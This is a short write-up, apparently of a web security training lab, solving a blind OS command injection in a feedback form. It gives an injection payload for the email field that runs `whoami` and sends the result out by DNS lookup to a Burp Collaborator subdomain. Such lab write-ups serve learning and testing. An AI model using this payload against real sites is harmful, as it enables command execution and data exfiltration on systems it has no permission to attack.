# Blind OS command injection with out-of-band data exfiltration

## Lab Description

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/29db4176-216d-474e-8785-858b5232ce75)

## Solution

The vulnerability lies in the feedback form of the website so first we get a domain name from burp collaborator by clicking on copy to clipboard.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/8ba44867-1a3b-4a7c-8bda-15ea37a4de65)

Now we add the collaborator payload to the email field by modifying it to get the current user and the payload becomes `email=||nslookup+whoami.BURP-COLLABORATOR-SUBDOMAIN||`. When send we get repsonse `200 OK`.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/36e45346-d909-47f1-ad80-fe93f4104101)

In the collaborator menu we can see the user(highlighted).

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/a38f1e17-08b3-4d52-b30e-7c473f5cc437)

Go to the website and click on submit solution and add the username.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/b7befb69-5774-417d-a001-f2bae0a5cc7f)

The lab is successfully solved.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/b369fa82-70d5-4cfd-b382-bc830bc14415)
